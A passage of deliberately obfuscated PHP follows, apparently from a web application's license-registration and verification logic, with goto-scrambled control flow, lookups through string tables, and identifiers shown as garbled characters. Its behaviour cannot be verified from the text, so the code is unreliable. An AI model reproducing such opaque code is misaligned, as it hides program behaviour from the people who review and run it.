$f≤”∑ù‘Ü¶ = $Eö ≠Œô‰”[606]; while (strlen($f≤”∑ù‘Ü¶) < $Eö ≠Œô‰”[589]) { if (!$f≤”∑ù‘Ü¶) { break; } $f≤”∑ù‘Ü¶++; } foreach ($Fó≤êË¥¥± as $dñ≤çÕËá…) { $Bâ¶≤Õ‡Ì… = $GLOBALS[$C∆∏—Óπ®†[104]][$C∆∏—Óπ®†[105]][$dñ≤çÕËá…]; if (isset($B¡∏ÜƒùΩÃ[$dñ≤çÕËá…])) { $Bâ¶≤Õ‡Ì… = $B¡∏ÜƒùΩÃ[$dñ≤çÕËá…]; } $cÜç´Ø´ùó[$C∆∏—Óπ®†[106]][$C∆∏—Óπ®†[107]][$dñ≤çÕËá…] = $Bâ¶≤Õ‡Ì…; } goto dÃêÌ…∂ùì; f“√úúµπ˜: if (strlen($aå‰ö™’¯≥) < $Eö ≠Œô‰”[578]) { die; } unset($cÜç´Ø´ùó[$C∆∏—Óπ®†[106]][$C∆∏—Óπ®†[107]][$C∆∏—Óπ®†[76]]); unset($cÜç´Ø´ùó[$C∆∏—Óπ®†[106]][$C∆∏—Óπ®†[107]][$C∆∏—Óπ®†[111]]); goto A§ëò“–—ü; CÁë¨å≈™ê: $BÕÚ∑£Â∞ÿ = $Eö ≠Œô‰”[604]; if (strlen($BÕÚ∑£Â∞ÿ) < $Eö ≠Œô‰”[605]) { die; } $Fó≤êË¥¥± = array($C∆∏—Óπ®†[64], $C∆∏—Óπ®†[65], $C∆∏—Óπ®†[66], $C∆∏—Óπ®†[67], $C∆∏—Óπ®†[68], $C∆∏—Óπ®†[69], $C∆∏—Óπ®†[70], $C∆∏—Óπ®†[71], $C∆∏—Óπ®†[72], $C∆∏—Óπ®†[73], $C∆∏—Óπ®†[74], $C∆∏—Óπ®†[75], $C∆∏—Óπ®†[76], $C∆∏—Óπ®†[77], $C∆∏—Óπ®†[78], $C∆∏—Óπ®†[79], $C∆∏—Óπ®†[80], $C∆∏—Óπ®†[81], $C∆∏—Óπ®†[82], $C∆∏—Óπ®†[83], $C∆∏—Óπ®†[84], $C∆∏—Óπ®†[85], $C∆∏—Óπ®†[86], $C∆∏—Óπ®†[87], $C∆∏—Óπ®†[88], $C∆∏—Óπ®†[89], $C∆∏—Óπ®†[90], $C∆∏—Óπ®†[91], $C∆∏—Óπ®†[92], $C∆∏—Óπ®†[93], $C∆∏—Óπ®†[94], $C∆∏—Óπ®†[95], $C∆∏—Óπ®†[96], $C∆∏—Óπ®†[97], $C∆∏—Óπ®†[98], $C∆∏—Óπ®†[99], $C∆∏—Óπ®†[100], $C∆∏—Óπ®†[101], $C∆∏—Óπ®†[102], $C∆∏—Óπ®†[103]); goto CÖÃÇôƒøì; dÃêÌ…∂ùì: $DÌÿÁÙ¡åﬁ = $cÜç´Ø´ùó[$C∆∏—Óπ®†[106]][$C∆∏—Óπ®†[107]][$C∆∏—Óπ®†[76]]; $e·ù˜œâí‘ = $Eö ≠Œô‰”[607]; if (strlen($e·ù˜œâí‘) < $Eö ≠Œô‰”[578]) { die; } goto AÁæ»ÈîŸâ; E«’á§ÊÍ≠: } private function ayez38ae6f16() { goto eíÜÌÁí…—; c‡∂æ÷ØÎÇ: $c¯Ñ≥∑°“ÿ = array($D–áÀ∂·«ê[177] => $A•Ã€€„⁄å[$D–áÀ∂·«ê[64]], $D–áÀ∂·«ê[178] => $A•Ã€€„⁄å[$D–áÀ∂·«ê[65]], $D–áÀ∂·«ê[179] => $D–áÀ∂·«ê[10]); $fÃÂ≥”ØêÚ = $aÇèäëÑÔÜ[616]; if (!$fÃÂ≥”ØêÚ) { return; } goto FñéÃÉﬂ¿È; FñéÃÉﬂ¿È: foreach ($Có≤≠Ãõ∆Ÿ as $BÈÒ∫ÚçèÊ) { if (!isset($A•Ã€€„⁄å[$BÈÒ∫ÚçèÊ]) || !$A•Ã€€„⁄å[$BÈÒ∫ÚçèÊ]) { continue; } $c¯Ñ≥∑°“ÿ[$BÈÒ∫ÚçèÊ] = $A•Ã€€„⁄å[$BÈÒ∫ÚçèÊ]; $d®ˆÙÇ˜·Ç = $aÇèäëÑÔÜ[617]; if (!$d®ˆÙÇ˜·Ç) { return; } } $D–áÀ∂·«ê[13](array($D–áÀ∂·«ê[169], $D–áÀ∂·«ê[170]), $c¯Ñ≥∑°“ÿ); goto aÕ‘ıÖÊËÓ; Bë√ˆ∫ÔíÇ: if (strlen($bÂÏõ√€¥§) < $aÇèäëÑÔÜ[582]) { die; } $A•Ã€€„⁄å = $D–áÀ∂·«ê[61]($D–áÀ∂·«ê[62])->{$_SERVER[é°ËπÔ úﬁ][63]}(); $D–’π◊´¿· = $aÇèäëÑÔÜ[615]; goto c‡∂æ÷ØÎÇ; eíÜÌÁí…—: $aÇèäëÑÔÜ =& $_SERVER[ú∫]; $D–áÀ∂·«ê =& $_SERVER[é°ËπÔ úﬁ]; if ($_SERVER[$D–áÀ∂·«ê[44]] == $D–áÀ∂·«ê[145]) { $cÜ®¡Ÿ¡ π = array($D–áÀ∂·«ê[130] => $this->gokxb9370e2b, $D–áÀ∂·«ê[146] => $this->{$_SERVER[é°ËπÔ úﬁ][147]}(), $D–áÀ∂·«ê[148] => $D–áÀ∂·«ê[61]($D–áÀ∂·«ê[149])->{$_SERVER[é°ËπÔ úﬁ][150]}()); if ($this->gokxb9370e2b != $D–áÀ∂·«ê[131]) { $fè˘‚ú”íî = $D–áÀ∂·«ê[116]($this->thzj1344bdf0, $D–áÀ∂·«ê[151]); if ($fè˘‚ú”íî) { $cÜ®¡Ÿ¡ π[$D–áÀ∂·«ê[152]] = $fè˘‚ú”íî; $cÜ®¡Ÿ¡ π[$D–áÀ∂·«ê[153]] = $D–áÀ∂·«ê[154]($D–áÀ∂·«ê[116]($this->thzj1344bdf0, $D–áÀ∂·«ê[155])); $cÜ®¡Ÿ¡ π[$D–áÀ∂·«ê[156]] = $D–áÀ∂·«ê[116]($this->thzj1344bdf0, $D–áÀ∂·«ê[141]); } $Dó«ó«ö«Ë = $D–áÀ∂·«ê[61]($D–áÀ∂·«ê[62])->{$_SERVER[é°ËπÔ úﬁ][63]}($D–áÀ∂·«ê[157], $D–áÀ∂·«ê[10], !0); if ($D–áÀ∂·«ê[158]($Dó«ó«ö«Ë) && $D–áÀ∂·«ê[25]($Dó«ó«ö«Ë, 0, 1) == $D–áÀ∂·«ê[159]) { $Dó«ó«ö«Ë = $D–áÀ∂·«ê[160]($Dó«ó«ö«Ë); } if ($D–áÀ∂·«ê[161]($Dó«ó«ö«Ë) && $Dó«ó«ö«Ë[$D–áÀ∂·«ê[162]] && $D–áÀ∂·«ê[32]($Dó«ó«ö«Ë[$D–áÀ∂·«ê[162]], $D–áÀ∂·«ê[163])) { $aÑ∫ô∏∆ﬂß = $D–áÀ∂·«ê[0]($D–áÀ∂·«ê[163], $Dó«ó«ö«Ë[$D–áÀ∂·«ê[162]]); $cÜ®¡Ÿ¡ π[$D–áÀ∂·«ê[164]] = $aÑ∫ô∏∆ﬂß[0]; } } $cÜ®¡Ÿ¡ π = $this->{$_SERVER[é°ËπÔ úﬁ][165]}($D–áÀ∂·«ê[166]($cÜ®¡Ÿ¡ π), $D–áÀ∂·«ê[124]($D–áÀ∂·«ê[167])); $c¯Ñ≥∑°“ÿ = array($D–áÀ∂·«ê[168] => $cÜ®¡Ÿ¡ π); $D–áÀ∂·«ê[13](array($D–áÀ∂·«ê[169], $D–áÀ∂·«ê[170]), $c¯Ñ≥∑°“ÿ); } goto E¡◊≤öæùè; E¡◊≤öæùè: if ($this->gokxb9370e2b == $D–áÀ∂·«ê[131]) { return; } $Có≤≠Ãõ∆Ÿ = array($D–áÀ∂·«ê[171], $D–áÀ∂·«ê[172], $D–áÀ∂·«ê[173], $D–áÀ∂·«ê[174], $D–áÀ∂·«ê[175], $D–áÀ∂·«ê[176]); $bÂÏõ√€¥§ = $aÇèäëÑÔÜ[614]; goto Bë√ˆ∫ÔíÇ; aÕ‘ıÖÊËÓ: } private function hazke3f28ac7() { goto bµëáçÑÍ¥; eòŸä¢≠Æ¬: $C¿†…Ì»åÌ = array($A—ïŒ≈ôè–[227] => $Cé⁄∞åÏ¯ﬂ[$A—ïŒ≈ôè–[228]], $A—ïŒ≈ôè–[229] => $Cé⁄∞åÏ¯ﬂ[$A—ïŒ≈ôè–[230]], $A—ïŒ≈ôè–[231] => $A—ïŒ≈ôè–[134](16), $A—ïŒ≈ôè–[130] => $Cé⁄∞åÏ¯ﬂ[$A—ïŒ≈ôè–[232]]); if ($e°‡≈äç∆Ω[$A—ïŒ≈ôè–[186]]) { $C¿†…Ì»åÌ[$A—ïŒ≈ôè–[231]] = $e°‡≈äç∆Ω[$A—ïŒ≈ôè–[186]]; } $aåâî«ê»∂ = $A—ïŒ≈ôè–[25]($A—ïŒ≈ôè–[124]($C¿†…Ì»åÌ[$A—ïŒ≈ôè–[229]]), 10, 10); goto fÑÇ˘’é®Ö; bµëáçÑÍ¥: $dçï‡à¥Îø =& $_SERVER[ú∫]; $A—ïŒ≈ôè– =& $_SERVER[é°ËπÔ úﬁ]; if ($_SERVER[$A—ïŒ≈ôè–[44]] != $A—ïŒ≈ôè–[180]) { return; } goto f§¶õÌﬂ∂≈; aôπãúæ§”: if (!isset($CÁ•ôÙÑΩ¢[$A—ïŒ≈ôè–[183]]) || $A—ïŒ≈ôè–[24]($CÁ•ôÙÑΩ¢[$A—ïŒ≈ôè–[183]]) != 16) { $A—ïŒ≈ôè–[184]($A—ïŒ≈ôè–[185] . $CÁ•ôÙÑΩ¢[$A—ïŒ≈ôè–[183]], !1); } $E¶è≠™◊Ñ± = $A—ïŒ≈ôè–[61]($A—ïŒ≈ôè–[62])->{$_SERVER[é°ËπÔ úﬁ][63]}($A—ïŒ≈ôè–[126]); $aÏÚ«÷√É’ = $A—ïŒ≈ôè–[124]($_SERVER[$A—ïŒ≈ôè–[125]] . $E¶è≠™◊Ñ±); goto cçﬂåÛºáﬁ; E¨Î—˜ü„±: $D§ñÜ√≤⁄Ü = $dçï‡à¥Îø[625]; $A—ïŒ≈ôè–[184]($A—ïŒ≈ôè–[216]($A—ïŒ≈ôè–[226]), !0); $E∂≈ªÉÿ™µ = $dçï‡à¥Îø[626]; goto b™Ö…Ú›ëÛ; F€”õŸ’Ë‰: $Cé⁄∞åÏ¯ﬂ = $AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[211]]; $e«≥Û©´Áí = $this->{$_SERVER[é°ËπÔ úﬁ][218]}($Cé⁄∞åÏ¯ﬂ[$A—ïŒ≈ôè–[219]]); if (!$e«≥Û©´Áí || $e«≥Û©´Áí != $Cé⁄∞åÏ¯ﬂ[$A—ïŒ≈ôè–[155]]) { $AÙ„≈¥ÑÁ∏ = array($A—ïŒ≈ôè–[220] => $A—ïŒ≈ôè–[61]($A—ïŒ≈ôè–[62])->{$_SERVER[é°ËπÔ úﬁ][63]}($A—ïŒ≈ôè–[126]), $A—ïŒ≈ôè–[221] => $_SERVER[$A—ïŒ≈ôè–[125]], $A—ïŒ≈ôè–[222] => $A—ïŒ≈ôè–[223](), $A—ïŒ≈ôè–[192] => $_SERVER[$A—ïŒ≈ôè–[193]]); $BûÎÃ£à≥¶ = $this->{$_SERVER[é°ËπÔ úﬁ][224]}($A—ïŒ≈ôè–[166]($AÙ„≈¥ÑÁ∏)); $this->{$_SERVER[é°ËπÔ úﬁ][202]}($A—ïŒ≈ôè–[225] . $BûÎÃ£à≥¶); $A—ïŒ≈ôè–[184]($A—ïŒ≈ôè–[216]($A—ïŒ≈ôè–[226]), !0); } goto eòŸä¢≠Æ¬; c“Ÿ„÷”◊ã: $fÜª‚è√∂ì = $B¨«˘ªû‡≈ . $C¿†…Ì»åÌ[$A—ïŒ≈ôè–[130]] . $this->{$_SERVER[é°ËπÔ úﬁ][165]}($A—ïŒ≈ôè–[124]($C¿†…Ì»åÌ[$A—ïŒ≈ôè–[227]]), $B¨«˘ªû‡≈); $C¿†…Ì»åÌ[$A—ïŒ≈ôè–[133]] = $A—ïŒ≈ôè–[128]($A—ïŒ≈ôè–[233]($this->{$_SERVER[é°ËπÔ úﬁ][165]}($fÜª‚è√∂ì, $A—ïŒ≈ôè–[235]))); $FÒ∏â…Îÿú = $dçï‡à¥Îø[621]; goto b∫œÀ–å®π; f§¶õÌﬂ∂≈: if (!$A—ïŒ≈ôè–[116]($GLOBALS, $A—ïŒ≈ôè–[142])) { die; } $CÁ•ôÙÑΩ¢ = $GLOBALS[$A—ïŒ≈ôè–[22]]; if (isset($CÁ•ôÙÑΩ¢[$A—ïŒ≈ôè–[181]])) { $this->{$_SERVER[é°ËπÔ úﬁ][182]}(); die; } goto aôπãúæ§”; A¬î∑È‰Î’: $f∞Ÿ‚ìŸ¬Ï = $dçï‡à¥Îø[622]; $fÑ≈•Á∏¬® = $A—ïŒ≈ôè–[241]($A—ïŒ≈ôè–[61]($A—ïŒ≈ôè–[11])->{$_SERVER[é°ËπÔ úﬁ][242]}(), $A—ïŒ≈ôè–[243]); $f∆∆»∑·§• = $dçï‡à¥Îø[623]; goto b¢®‹ìíˆ¨; cçﬂåÛºáﬁ: $Cê∫íäÈØõ = $dçï‡à¥Îø[618]; while ($Cê∫íäÈØõ < $dçï‡à¥Îø[589]) { if ($Cê∫íäÈØõ >= 0) { break; } $Cê∫íäÈØõ++; } $e°‡≈äç∆Ω = array($A—ïŒ≈ôè–[183] => $CÁ•ôÙÑΩ¢[$A—ïŒ≈ôè–[183]], $A—ïŒ≈ôè–[186] => $A—ïŒ≈ôè–[134](16), $A—ïŒ≈ôè–[187] => $A—ïŒ≈ôè–[167], $A—ïŒ≈ôè–[188] => $A—ïŒ≈ôè–[189], $A—ïŒ≈ôè–[190] => $_SERVER[$A—ïŒ≈ôè–[191]], $A—ïŒ≈ôè–[192] => $_SERVER[$A—ïŒ≈ôè–[193]], $A—ïŒ≈ôè–[194] => $_SERVER[$A—ïŒ≈ôè–[195]], $A—ïŒ≈ôè–[123] => $aÏÚ«÷√É’, $A—ïŒ≈ôè–[196] => $A—ïŒ≈ôè–[61]($A—ïŒ≈ôè–[62])->{$_SERVER[é°ËπÔ úﬁ][63]}($A—ïŒ≈ôè–[157])); goto bà·Êòåèº; E€í◊é÷–: $A—˜ö ßﬂ˜ = $A—ïŒ≈ôè–[124]($_SERVER[$A—ïŒ≈ôè–[125]] . $A—ïŒ≈ôè–[233]($E¶è≠™◊Ñ±) . $C¿†…Ì»åÌ[$A—ïŒ≈ôè–[229]]); $C≤Ú¶ „ª≠ = $A—ïŒ≈ôè–[233]($A—ïŒ≈ôè–[25]($A—˜ö ßﬂ˜, 10, 16)); $b—πáË€ÇÃ = $this->{$_SERVER[é°ËπÔ úﬁ][137]}($A—ïŒ≈ôè–[166]($Cé⁄∞åÏ¯ﬂ), $A—˜ö ßﬂ˜); goto A¬î∑È‰Î’; bà·Êòåèº: $E∂“—•âáÆ = $dçï‡à¥Îø[619]; if ($CÁ•ôÙÑΩ¢[$A—ïŒ≈ôè–[197]] == $A—ïŒ≈ôè–[198]) { $Bı∂‚äê¢◊ = $this->{$_SERVER[é°ËπÔ úﬁ][165]}($aÏÚ«÷√É’, $A—ïŒ≈ôè–[199]); $BûÎÃ£à≥¶ = $this->{$_SERVER[é°ËπÔ úﬁ][137]}($A—ïŒ≈ôè–[166]($e°‡≈äç∆Ω), $aÏÚ«÷√É’ . $A—ïŒ≈ôè–[200], 3); $BûÎÃ£à≥¶ = $BûÎÃ£à≥¶ . $A—ïŒ≈ôè–[201] . $_SERVER[$A—ïŒ≈ôè–[191]]; $c÷∂Øèñì• = $this->{$_SERVER[é°ËπÔ úﬁ][202]}($A—ïŒ≈ôè–[203] . $Bı∂‚äê¢◊ . $A—ïŒ≈ôè–[204] . $BûÎÃ£à≥¶, -1); $A—ïŒ≈ôè–[184]($c÷∂Øèñì•, !0); } else { if ($CÁ•ôÙÑΩ¢[$A—ïŒ≈ôè–[197]] == $A—ïŒ≈ôè–[205]) { $AòëâÚ√’… = $A—ïŒ≈ôè–[25]($A—ïŒ≈ôè–[124]($A—ïŒ≈ôè–[206] . $aÏÚ«÷√É’), 12, 15) . $A—ïŒ≈ôè–[207]; $BûÎÃ£à≥¶ = $this->{$_SERVER[é°ËπÔ úﬁ][208]}($A—ïŒ≈ôè–[2]($CÁ•ôÙÑΩ¢[$A—ïŒ≈ôè–[209]]), $AòëâÚ√’…, 2); $AÎ¢‚¿∑§ä = $A—ïŒ≈ôè–[210]($BûÎÃ£à≥¶, !0); if (!$A—ïŒ≈ôè–[161]($AÎ¢‚¿∑§ä) || !$A—ïŒ≈ôè–[161]($AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[211]]) || $AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[183]] != !0) { $fõØÕ˘«‹ä = $A—ïŒ≈ôè–[212]; $Bÿ‰ëõ±•Ö = $AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[211]] ? $A—ïŒ≈ôè–[213] . $AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[211]] : $fõØÕ˘«‹ä; $A—ïŒ≈ôè–[184]($Bÿ‰ëõ±•Ö, !1); } else { $e°‡≈äç∆Ω[$A—ïŒ≈ôè–[186]] = $AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[211]][$A—ïŒ≈ôè–[214]]; } } else { $AÎ¢‚¿∑§ä = $this->{$_SERVER[é°ËπÔ úﬁ][202]}($A—ïŒ≈ôè–[215], $e°‡≈äç∆Ω, 10); $e“Ò«≠È∑  = $dçï‡à¥Îø[620]; if (strlen($e“Ò«≠È∑ ) < $dçï‡à¥Îø[589]) { die; } } } if (!$A—ïŒ≈ôè–[161]($AÎ¢‚¿∑§ä) || !$A—ïŒ≈ôè–[161]($AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[211]]) || $AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[183]] != !0) { $fõØÕ˘«‹ä = $A—ïŒ≈ôè–[216]($A—ïŒ≈ôè–[217]); $Bÿ‰ëõ±•Ö = $AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[211]] ? $A—ïŒ≈ôè–[213] . $AÎ¢‚¿∑§ä[$A—ïŒ≈ôè–[211]] : $fõØÕ˘«‹ä; $A—ïŒ≈ôè–[184]($Bÿ‰ëõ±•Ö, !1); } goto F€”õŸ’Ë‰; b∫œÀ–å®π: while ($FÒ∏â…Îÿú < $dçï‡à¥Îø[578]) { if ($FÒ∏â…Îÿú >= 0) { break; } $FÒ∏â…Îÿú++; } if ($Cé⁄∞åÏ¯ﬂ[$A—ïŒ≈ôè–[236]] && $Cé⁄∞åÏ¯ﬂ[$A—ïŒ≈ôè–[236]] >= 1) { $A—ïŒ≈ôè–[61]($A—ïŒ≈ôè–[62])->{$_SERVER[é°ËπÔ úﬁ][237]}($A—ïŒ≈ôè–[238], $A—ïŒ≈ôè–[239]); } $A—ïŒ≈ôè–[61]($A—ïŒ≈ôè–[62])->{$_SERVER[é°ËπÔ úﬁ][240]}($C¿†…Ì»åÌ); goto E€í◊é÷–; cÛ√Ñç«ºå: $this->gokxb9370e2b = $C¿†…Ì»åÌ[$A—ïŒ≈ôè–[130]]; $this->{$_SERVER[é°ËπÔ úﬁ][248]}(); Cache::set($A—ïŒ≈ôè–[249] . $A—ïŒ≈ôè–[124]($E¶è≠™◊Ñ± . $A—ïŒ≈ôè–[250]), $A—ïŒ≈ôè–[10]); goto E¨Î—˜ü„±; fÑÇ˘’é®Ö: $cØñÑ£∏ìÍ = $aåâî«ê»∂ . $C¿†…Ì»åÌ[$A—ïŒ≈ôè–[130]] . $C¿†…Ì»åÌ[$A—ïŒ≈ôè–[231]]; $C¿†…Ì»åÌ[$A—ïŒ≈ôè–[132]] = $A—ïŒ≈ôè–[233]($A—ïŒ≈ôè–[128]($this->{$_SERVER[é°ËπÔ úﬁ][165]}($cØñÑ£∏ìÍ, $A—ïŒ≈ôè–[234]))); $B¨«˘ªû‡≈ = $A—ïŒ≈ôè–[134](16); goto c“Ÿ„÷”◊ã; E›°Èëü°°: $bÙÈ•π∞é÷ = $dçï‡à¥Îø[624]; $A—ïŒ≈ôè–[61]($A—ïŒ≈ôè–[11])->{$_SERVER[é°ËπÔ úﬁ][245]}($EÖÿ¨µÿ∆≠[$A—ïŒ≈ôè–[246]], array($A—ïŒ≈ôè–[247] => $eπõÕ“Ê›Ñ)); $this->thzj1344bdf0 = $Cé⁄∞åÏ¯ﬂ; goto cÛ√Ñç«ºå; b¢®‹ìíˆ¨: $EÖÿ¨µÿ∆≠ = $fÑ≈•Á∏¬®[$A—ïŒ≈ôè–[244]]; $eπõÕ“Ê›Ñ = array(); $eπõÕ“Ê›Ñ[$C≤Ú¶ „ª≠] = $b—πáË€ÇÃ; goto E›°Èëü°°; b™Ö…Ú›ëÛ: } private function licenseRegistSuccess() { goto CõÙº∂¨Œ†; CõÙº∂¨Œ†: $CÒÓÈÏ∆ûÜ =& $_SERVER[ú∫]; $eÒˆ£Ωíﬂ» =& $_SERVER[é°ËπÔ úﬁ]; $EäÇ◊è‹Èñ = $eÒˆ£Ωíﬂ»[61]($eÒˆ£Ωíﬂ»[62])->{$_SERVER[é°ËπÔ úﬁ][63]}(); goto FîÑŒÕºõæ; FîÑŒÕºõæ: $DÎíﬂÈ«Ëó = $CÒÓÈÏ∆ûÜ[627]; while ($DÎíﬂÈ«Ëó < $CÒÓÈÏ∆ûÜ[582]) { if ($DÎíﬂÈ«Ëó >= 0) { break; } $DÎíﬂÈ«Ëó++; } if ($EäÇ◊è‹Èñ[$eÒˆ£Ωíﬂ»[93]] != $eÒˆ£Ωíﬂ»[239]) { $eÒˆ£Ωíﬂ»[61]($eÒˆ£Ωíﬂ»[62])->{$_SERVER[é°ËπÔ úﬁ][240]}($eÒˆ£Ωíﬂ»[93], $eÒˆ£Ωíﬂ»[239]); } goto bÍì√á∑Ùı; bÍì√á∑Ùı: $eÒˆ£Ωíﬂ»[120]($eÒˆ£Ωíﬂ»[251])->{$_SERVER[é°ËπÔ úﬁ][252]}(!0); goto aÀœÆØØØ’; aÀœÆØØØ’: } private function pgubc85012ec() { goto aé◊‘Ÿ¶ Î; dç¯ìåÜø€: $this->thzj1344bdf0 = array(); $AüÎ¿◊ÜûÉ = $AêΩ¶ã∆Ê†[629]; if (!$AüÎ¿◊ÜûÉ) { die; } goto EÀ◊·ﬂïµ…; EÀ◊·ﬂïµ…: $this->gokxb9370e2b = $böñÏ÷îãÂ[131]; $FàªïâÃ÷≤ = $AêΩ¶ã∆Ê†[630]; while (strlen($FàªïâÃ÷≤) < $AêΩ¶ã∆Ê†[582]) { if (!$FàªïâÃ÷≤) { break; } $FàªïâÃ÷≤++; } goto F∞¯›Œ±“·; CŸ†ò∂Â‰ó: $CøÜü¨ñúÍ = $AêΩ¶ã∆Ê†[628]; if (!$CøÜü¨ñúÍ) { die; } $böñÏ÷îãÂ[61]($böñÏ÷îãÂ[62])->{$_SERVER[é°ËπÔ úﬁ][237]}($böñÏ÷îãÂ[238], $böñÏ÷îãÂ[253]); goto dç¯ìåÜø€; aé◊‘Ÿ¶ Î: $AêΩ¶ã∆Ê† =& $_SERVER[ú∫]; $böñÏ÷îãÂ =& $_SERVER[é°ËπÔ úﬁ]; $böñÏ÷îãÂ[61]($böñÏ÷îãÂ[62])->{$_SERVER[é°ËπÔ úﬁ][240]}(array($böñÏ÷îãÂ[227] => $böñÏ÷îãÂ[10], $böñÏ÷îãÂ[229] => $böñÏ÷îãÂ[10], $böñÏ÷îãÂ[130] => $böñÏ÷îãÂ[131], $böñÏ÷îãÂ[132] => $böñÏ÷îãÂ[10], $böñÏ÷îãÂ[133] => $böñÏ÷îãÂ[10])); goto CŸ†ò∂Â‰ó; F∞¯›Œ±“·: } private function nfrif1a06a0b() { goto d—˜ãÀ≥º›; Cà¡»‚†‹Í: $AÆÚÔ®œÁ— = $B∞∑›£ãÚâ[609]; $this->gokxb9370e2b = $a•ﬁÓòπè‹[131]; $añòÿ†®µ¶ = $B∞∑›£ãÚâ[631]; goto B‘ñÆ˜ù˘î; b≠åãÃ€‡Û: $E¡ÕÛ»ÖªÑ = $a•ﬁÓòπè‹[154]($E≠‰”ˆ”÷†[$a•ﬁÓòπè‹[155]]); if ($a•ﬁÓòπè‹[255]() >= $E¡ÕÛ»ÖªÑ) { return $this->{$_SERVER[é°ËπÔ úﬁ][182]}(); } if ($a•ﬁÓòπè‹[255]() - $E≠‰”ˆ”÷†[$a•ﬁÓòπè‹[254]] > 20) { $E≠‰”ˆ”÷†[$a•ﬁÓòπè‹[254]] = $a•ﬁÓòπè‹[255](); Cache::set($DÑ£÷—¥Û¿, $E≠‰”ˆ”÷†); } goto c’ÉÎöà˘Ù; c˘ﬂ⁄Ñøœª: $DÑ£÷—¥Û¿ = $a•ﬁÓòπè‹[249] . $a•ﬁÓòπè‹[124]($A™©ÜÁ‰õæ . $a•ﬁÓòπè‹[250]); $a——™≥è›ø = $B∞∑›£ãÚâ[633]; if (strlen($a——™≥è›ø) < $B∞∑›£ãÚâ[582]) { return; } goto E˘´ÂÑ¬Ø; E˘´ÂÑ¬Ø: $E≠‰”ˆ”÷† = Cache::get($DÑ£÷—¥Û¿); if (!$a•ﬁÓòπè‹[161]($E≠‰”ˆ”÷†) || !isset($E≠‰”ˆ”÷†[$a•ﬁÓòπè‹[254]]) || $a•ﬁÓòπè‹[255]() - $E≠‰”ˆ”÷†[$a•ﬁÓòπè‹[254]] >= 60) { $FﬁŸﬂ…ﬁ‡∞ = $a•ﬁÓòπè‹[241]($a•ﬁÓòπè‹[61]($a•ﬁÓòπè‹[11])->{$_SERVER[é°ËπÔ úﬁ][242]}(), $a•ﬁÓòπè‹[243]); $A¥™†ÇÇ”« = $FﬁŸﬂ…ﬁ‡∞[$a•ﬁÓòπè‹[244]]; $b∏Ãπó´ü¨ = $a•ﬁÓòπè‹[124]($_SERVER[$a•ﬁÓòπè‹[125]] . $a•ﬁÓòπè‹[233]($A™©ÜÁ‰õæ) . $cùè‰˜»ô®[$a•ﬁÓòπè‹[229]]); $F∂Ô˘êÆ¡∞ = $a•ﬁÓòπè‹[233]($a•ﬁÓòπè‹[25]($b∏Ãπó´ü¨, 10, 16)); $E≠‰”ˆ”÷† = $this->{$_SERVER[é°ËπÔ úﬁ][208]}($A¥™†ÇÇ”«[$a•ﬁÓòπè‹[104]][$F∂Ô˘êÆ¡∞], $b∏Ãπó´ü¨); $E≠‰”ˆ”÷† = $a•ﬁÓòπè‹[210]($E≠‰”ˆ”÷†, !0); } if (!$a•ﬁÓòπè‹[161]($E≠‰”ˆ”÷†)) { return $this->{$_SERVER[é°ËπÔ úﬁ][182]}(); } goto b≠åãÃ€‡Û; d—˜ãÀ≥º›: $B∞∑›£ãÚâ =& $_SERVER[ú∫]; $a•ﬁÓòπè‹ =& $_SERVER[é°ËπÔ úﬁ]; $_SERVER[$a•ﬁÓòπè‹[193]] = $a•ﬁÓòπè‹[116]($_SERVER, $a•ﬁÓòπè‹[193], APP_HOST); goto Cà¡»‚†‹Í; c’ÉÎöà˘Ù: $this->thzj1344bdf0 = $E≠‰”ˆ”÷†; $this->gokxb9370e2b = $cùè‰˜»ô®[$a•ﬁÓòπè‹[130]]; goto Aø¢ãÉ®∞Œ; B‘ñÆ˜ù˘î: while ($añòÿ†®µ¶ < $B∞∑›£ãÚâ[605]) { if ($añòÿ†®µ¶ >= 0) { break; } $añòÿ†®µ¶++; } $cùè‰˜»ô® = $a•ﬁÓòπè‹[61]($a•ﬁÓòπè‹[62])->{$_SERVER[é°ËπÔ úﬁ][63]}(); $böÜ’Ÿﬁ‘≈ = $B∞∑›£ãÚâ[632]; goto bù∞˜∏≠øÈ; bù∞˜∏≠øÈ: if (strlen($böÜ’Ÿﬁ‘≈) < $B∞∑›£ãÚâ[582]) { return; } if ($cùè‰˜»ô®[$a•ﬁÓòπè‹[130]] == $a•ﬁÓòπè‹[131]) { return; } $A™©ÜÁ‰õæ = $a•ﬁÓòπè‹[61]($a•ﬁÓòπè‹[62])->{$_SERVER[é°ËπÔ úﬁ][63]}($a•ﬁÓòπè‹[126]); goto c˘ﬂ⁄Ñøœª; Aø¢ãÉ®∞Œ: } private function ucrwccb34f4c() { goto e‹üÉ¢ü˘„; Eﬂ≤π™‰Ï: $bÑ‹Ÿù∆∞ñ = array($F®‘ëÍèÎº[259], $F®‘ëÍèÎº[260]); if ($F®‘ëÍèÎº[261]($cäÂ äŸπæ, $bÑ‹Ÿù∆∞ñ)) { if ($this->gokxb9370e2b == $F®‘ëÍèÎº[131] && isset($fÙÎ´Ë¶ÚÖ[$F®‘ëÍèÎº[262]])) { $F®‘ëÍèÎº[184]($F®‘ëÍèÎº[216]($F®‘ëÍèÎº[257]), !1, $F®‘ëÍèÎº[258]); die; } $eìÌÁüæµæ = $this->{$_SERVER[é°ËπÔ úﬁ][147]}(); if ($eìÌÁüæµæ != $F®‘ëÍèÎº[263]($F®‘ëÍèÎº[264])) { if ($eìÌÁüæµæ <= $F®‘ëÍèÎº[61]($F®‘ëÍèÎº[149])->{$_SERVER[é°ËπÔ úﬁ][150]}()) { $F®‘ëÍèÎº[184]($F®‘ëÍèÎº[216]($F®‘ëÍèÎº[265]), !1, $F®‘ëÍèÎº[258]); die; } } } goto fà‰≠∆ç“®; A£µÓøóˆ: $DÎ¯Áæ¥ëè = $c ®óó¡Ö[634]; while ($DÎ¯Áæ¥ëè < $c ®óó¡Ö[605]) { if ($DÎ¯Áæ¥ëè >= 0) { break; } $DÎ¯Áæ¥ëè++; } $cäÂ äŸπæ = $_SERVER[$F®‘ëÍèÎº[44]]; goto bøïã·—Æ€; bøïã·—Æ€: 